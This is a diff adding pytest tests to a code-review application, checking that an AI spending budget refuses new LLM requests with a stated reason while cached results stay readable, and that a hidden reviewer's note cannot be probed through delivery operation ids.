+    from lemoncrow.infra.internal_llm import openai_client
+    from lemoncrow.infra.internal_llm.result import InternalLLMChatResult
+    from lemoncrow.pro.capabilities.review import architecture_delta
+
+    from .test_review_architecture_delta import _explain_delta, _explain_execution
+
+    sent: list[str] = []
+    delta = _explain_delta()
+    edge_id = next(edge["id"] for edge in delta["graph"]["edges"] if edge["delta_status"] == "added")
+    explanation = _explain_execution(edge_id).result
+    monkeypatch.setattr(architecture_delta, "build_architecture_delta_from_revision", lambda *a, **k: delta)
+
+    def provider(*args: Any, **kwargs: Any) -> InternalLLMChatResult:
+        sent.append("request")
+        return InternalLLMChatResult(
+            content=json.dumps(explanation),
+            parsed_json=explanation,
+            input_tokens=8,
+            output_tokens=4,
+            model="gpt-4o-mini",
+        )
+
+    monkeypatch.setattr(openai_client, "chat_with_result", provider)
+    monkeypatch.setattr(openai_client, "chat_stream", lambda *a, **k: sent.append("stream") or "x")
+    monkeypatch.setenv("LEMONCROW_LLM_BACKEND", "openai")
+    monkeypatch.setenv("LEMONCROW_OPENAI_MODEL", "gpt-4o-mini")
+    return sent, delta
+
+
+def _set_ai_budget(value: float | None) -> None:
+    from lemoncrow.core import settings as lc_settings
+    from lemoncrow.pro.capabilities.review.fix_agent import settings_root
+
+    if value is None:
+        lc_settings.unset_setting(settings_root(), "intelligence.monthly_budget_usd")
+    else:
+        lc_settings.write_setting(settings_root(), "intelligence.monthly_budget_usd", value)
+
+
+def test_at_zero_an_architecture_explanation_already_made_is_returned_and_a_new_one_is_refused_with_the_reason(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    sent, _delta = _budget_world(workspace, monkeypatch)
+    url = f"/api/reviews/{workspace.review_id}/architecture-explain"
+    made = workspace.post(url, json={})
+    assert made.status_code == 200 and made.json()["status"] == "ready", made.text
+    assert sent == ["request"]
+    runs = workspace.store.list_intelligence_runs(workspace.review_id, capability="architecture_explain")
+
+    _set_ai_budget(0)
+    again = workspace.post(url, json={})
+    assert again.status_code == 200 and again.json()["status"] == "ready", again.text
+    assert again.json()["intelligence"]["cache_hit"] is True
+    assert again.json()["result"] == made.json()["result"], "what was made stays"
+
+    fresh = workspace.post(url, json={"driver": "openai", "model": "gpt-4o"})  # another route: nothing cached
+    assert fresh.status_code == 409 and fresh.json()["detail"] == "AI budget is $0", fresh.text
+    assert sent == ["request"], "the provider was never called again"
+    assert (
+        workspace.store.list_intelligence_runs(workspace.review_id, capability="architecture_explain") == runs
+    ), "a refusal writes no run"
+    _set_ai_budget(None)
+    allowed = workspace.post(url, json={"driver": "openai", "model": "gpt-4o"})
+    assert allowed.status_code == 200 and allowed.json()["status"] == "ready" and sent == ["request", "request"]
+
+
+def test_a_used_up_budget_refuses_a_new_explanation_with_the_date(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    from lemoncrow.pro.capabilities.review.background_budget_store import LocalBackgroundBudgetStore
+    from lemoncrow.pro.capabilities.review.fix_agent import settings_root
+
+    sent, _delta = _budget_world(workspace, monkeypatch)
+    _set_ai_budget(1)
+    LocalBackgroundBudgetStore(settings_root()).meter(calls=1, cost_micros=1_000_000)
+    refused = workspace.post(f"/api/reviews/{workspace.review_id}/architecture-explain", json={})
+    assert refused.status_code == 409 and refused.json()["detail"].startswith("AI budget used up until "), refused.text
+    assert sent == []
+
+
+def test_at_zero_ask_is_refused_with_the_reason_before_anything_is_stored_or_sent(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    sent, _delta = _budget_world(workspace, monkeypatch)
+    _set_ai_budget(0)
+    refused = workspace.post(
+        f"/api/reviews/{workspace.review_id}/ask", json={"revision_number": 0, "body": "Why?", "driver": "openai"}
+    )
+    assert refused.status_code == 409 and refused.json()["detail"] == "AI budget is $0", refused.text
+    streamed = workspace.post(
+        f"/api/reviews/{workspace.review_id}/ask/stream",
+        json={"revision_number": 0, "body": "Why?", "driver": "openai"},
+    )
+    # The stream opens, then says the refusal as its error event (409, the reason), before any answer.
+    events = [json.loads(line) for line in streamed.text.splitlines() if line.strip()]
+    assert events[-1] == {"type": "error", "status": 409, "detail": "AI budget is $0"}, streamed.text
+    assert sent == [] and workspace.store.list_ask_messages(workspace.review_id) == ()
+    # What was already asked stays readable at $0.
+    assert workspace.get(f"/api/reviews/{workspace.review_id}/ask").status_code == 200
+
+
+@pytest.mark.parametrize("lens_active", [False, True])
+def test_a_delivery_operation_over_a_hidden_authors_note_reads_as_an_unknown_one(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch, lens_active: bool
+) -> None:
+    """P9-4 R12-2: the id of a delivery operation over the first reviewer's note answers a hidden second reviewer as an
+    id nobody holds does, whether or not the request itself runs under the viewer lens (under it ``get_annotation``
+    answers None, which must not read as "no such note" and so as an operation that exists)."""
+
+    from contextvars import ContextVar
+
+    from lemoncrow.pro.capabilities.review import viewer_lens
+
+    note = workspace.post(
+        f"/api/reviews/{workspace.review_id}/annotations",
+        json={"path": "src/session.py", "start_line": 10, "body": "his"},
+    ).json()["annotation"]
+    revision = workspace.store.latest_revision(workspace.review_id)
+    assert revision is not None
+    real_id, made_up = "fop-" + "ab" * 16, "fop-" + "ab" * 13 + "000000"
+    workspace.store.record_delivery(
+        DeliveryRecord(
+            id="",
+            annotation_id=note["id"],
+            target_type="agent_session",
+            target_ref="claude:session-primary",
+            state="sent",
+            operation_id=real_id,
+            revision_id=revision.id,
+            feedback_hash="a" * 64,
+            annotation_version=1,
+        )
+    )
+    path = f"/api/reviews/{workspace.review_id}/feedback/deliver"
+
+    def answer(operation_id: str) -> tuple[int, str]:
+        response = workspace.post(
+            path,
+            json={
+                "operation_id": operation_id,
+                "expected_revision_id": revision.id,
+                "expected_feedback_hash": "b" * 64,
+            },
+        )
+        return response.status_code, response.text.replace(operation_id, "<ID>")
+
+    # for anyone not hidden from him, the operation exists and refuses a different hash: the control for what follows
+    assert answer(real_id)[0] == 409 and "identity does not match" in answer(real_id)[1]
+    assert "identity does not match" not in answer(made_up)[1]
+
+    workspace.client.app.state.review_second_reviewer_hidden_authors = lambda _session: {note["created_by"]}
+    if lens_active:
+        monkeypatch.setattr(
+            viewer_lens,
+            "_HIDDEN",
+            # a default, not .set(): the request runs in the app's own threads, which do not inherit this one's context
+            ContextVar("hidden", default={workspace.review_id: frozenset({note["created_by"]})}),  # noqa: B039
+        )
+    assert answer(real_id) == answer(made_up)
